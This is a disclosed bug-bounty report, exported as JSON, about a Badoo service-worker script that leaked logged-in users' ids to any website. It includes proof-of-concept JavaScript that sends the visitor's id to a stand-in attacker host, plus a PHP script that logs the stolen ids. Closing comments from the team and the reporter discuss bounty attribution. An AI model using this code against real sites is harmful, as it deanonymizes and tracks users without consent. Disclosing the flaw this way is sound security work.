{
  "id": 139192,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkxOTI=",
  "url": "https://hackerone.com/reports/139192",
  "title": "Ability to collect users' ids that have visited a specific web page with malicious code ",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-05-16T20:31:32.679Z",
  "submitted_at": "2016-05-16T20:31:32.679Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "saeedhashem",
    "url": "/saeedhashem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/043/028/c3aeff767740154872720169f486cd81bf40dc9a_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 21554,
    "url": "https://hackerone.com/bumble",
    "handle": "bumble",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/554/13fb93fae5496e8e259a0f2a2fba3a72ca10550b_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/554/13fb93fae5496e8e259a0f2a2fba3a72ca10550b_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Bumble",
      "twitter_handle": "bumble",
      "website": "https://bumble.com/",
      "about": "Bumble - Date, Meet, Network Better"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-06-03T12:53:34.363Z",
  "bug_reporter_agreed_on_going_public_at": "2016-06-03T10:52:33.111Z",
  "team_member_agreed_on_going_public_at": "2016-06-03T12:53:34.140Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hey ,\n\nRegarding this report #130453 , I'm pretty sure that there's a little misunderstanding of the issue , so please let me clarify the issue a bit more .\n\nThe issue is not about the disclosure of user's id , that wouldn't be considered an issue at all because every website puts user's id in the user's profile usually , The issue here is the disclosure of badoo user who visited the webpage which contained the exploit code , that allows any site owner or advertisement campaign designer to exploit this issue maliciously by escalating a public and general ads campaign to a targeted ads campaign after collecting the users who were interested in the general campaign .  \n\nLet's clarify a bit further by some details and exploit scenario .\n\n###What made the vulnerability appear ?\n\n1. This script `https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` being contained information dependent on the currently logged in user .\n2. This information can identify the currently logged in user.\n3. The same script being public , and can be called and fetched by any rogue script on any website  .\n\n\n###What makes it an issue ?\n\nIt's considered as a privacy violation . If I visited some website , the website owner is not supposed to figure out my identity , but this issue allow him to do so .\n\nAdditionally the issue allows any one to figure out weather I'm logged in or logged out , and by which account .\n\n###How can any one exploit the issue maliciously ? \n\nLet's consider the following as an exploit scenario .\n\nI'm a commercial website owner who  found out about this issue and decided to take advantage to my new product advertisement campaign .\n\nSo , I designed a plan as following :\n\n1. Start a public and general campaign by setting up the new product page in my website and distributing the link to the page every where , including badoo .\n2. The new product page should contain the Exploit code written below .\n\n```\n<html>\n<script src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>\n</head>\n<body>\n<script>\nfunction UnmaskUser(str) {\nreturn str.split('=')[0];\n}\nwindow.onload = function(){\nvar user = UnmaskUser(user_id);\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' user , true);\nxhr.send();\n};\n</script>\n</html>\n```\nAnd the `identity-stealer.php` should have the code :\n```\n<?php\n$user = $_GET['victim'];\n$fd = fopen(\"badoo-users-interested-in-my-product.txt\",\"a\");\n fwrite($fd, $user);\n fclose($fd);\n?>\n```\n\n3. The people who may be interested in my new product will start to visit my new product page .\n4. After a period of time I will be having a txt file `badoo-users-interested-in-my-product.txt` on my server with a list of ids of all badoo users who have visited my new product page while they are logged into badoo .\n5. Now I can start a more specific and targeted advertisement campaign by contacting those badoo users directly by private messages or emails .\n\n\n##Note : \nThis should be clarified the matter , so if you still think this issue isn't considered a security issue or privacy violation you can close the report as informative .\n\n\nBest regards , \nThanks ,\n\nSaeed H. ",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-07-03T10:52:33.340Z",
  "allow_singular_disclosure_after": -291008907.2826181,
  "singular_disclosure_allowed": true,
  "vote_count": 6,
  "voters": [
    "k0z3r0",
    "malcolmx",
    "jineesh4k",
    "iamnasef",
    "spetr0x",
    "dyabla"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 2025,
      "category": "team",
      "content": "Despite this issue was reported in #130453 first, there was some misunderstanding. Reporter in #130453 was quite aggressive and unpleasant instead of describing in details what's wrong. Moreover, he wrote an article about this on [public resource]( https://www.seekurity.com/blog/general/badoo-hotornot-privacy-disclosure-feature-not-a-bug/).\n\n@saeedhashem on the other hand was quite kind and informative. That's why we decided to award this report with the bounty, not the first one.\n\nGuys please be informative and patient. We do value every single report to our program but there can be some misunderstandings because of huge amount of crap. \nPlease read our [rules](https://hackerone.com/badoo) carefully before submitting bugs.",
      "updated_at": "2016-06-03T12:51:51.554Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 5780,
        "username": "uyga",
        "name": "Ilya Ageev",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2014-05-03T13:03:54.979Z",
        "url": "https://hackerone.com/uyga",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MjU5MSwicHVyIjoiYmxvYl9pZCJ9fQ==--4dd273692be7beafe9f0dc46db4fbfd7fb5fe6f3/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--cf3aeca803d1baf476958c689ca7b472a4cb54f1/uyga.jpg"
        }
      }
    },
    {
      "id": 2026,
      "category": "researcher",
      "content": "I truly appreciate the team's decision , and thank you @uyga for your kind words about me .\n\nBut , since the reporter of the initial report  @symbiansymoh is a friend and colleague of mine , I don't really like him being described with such words in my report , many thanks to him for discovering and disclosing the vulnerability , that's what pointed me to it in the first place .\n\nI think @symbiansymoh should've put the very same effort he made writing his blog post in his report instead , misunderstanding happens all the time .\n\nI also think @uyga should've put one or two additional team members to help each other for a better understanding of the issue , even if their was lack of information in the report .\n\nAnyway , we all learn new things every day and this was a lesson to learn for all of us .\n\nThanks again @uyga ,\nThanks again @symbiansymoh ,",
      "updated_at": "2016-06-03T19:10:03.022Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 43028,
        "username": "saeedhashem",
        "name": "Saeed Hashem",
        "bio": "Another cyber security guy - Web Application Security Researcher",
        "cleared": false,
        "verified": true,
        "website": null,
        "location": "",
        "created_at": "2015-11-04T04:08:37.451Z",
        "url": "https://hackerone.com/saeedhashem",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/043/028/c3aeff767740154872720169f486cd81bf40dc9a_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/028/c3aeff767740154872720169f486cd81bf40dc9a_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NjI2NywicHVyIjoiYmxvYl9pZCJ9fQ==--423ba2bcf83d006db38a89bb8eba222c7cdb66de/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--cf3aeca803d1baf476958c689ca7b472a4cb54f1/12028625_1054110741275006_4363500002517662683_o.jpg"
        }
      }
    }
  ]
}
